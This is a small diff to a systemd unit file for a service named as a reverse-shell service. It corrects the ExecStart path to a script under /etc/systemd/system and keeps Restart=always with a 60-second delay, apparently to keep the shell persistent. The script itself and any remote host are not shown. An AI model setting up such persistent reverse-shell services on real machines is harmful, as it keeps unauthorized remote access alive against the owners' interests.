@@ -6,7 +6,7 @@ StartLimitIntervalSec=0
 
 [Service]
 Type=simple
-ExecStart=/etc/systemd/com.jondayley.reverseShellService/main.sh
+ExecStart=/etc/systemd/system/com.jondayley.reverseShellService/main.sh
 Restart=always
 RestartSec=60
 
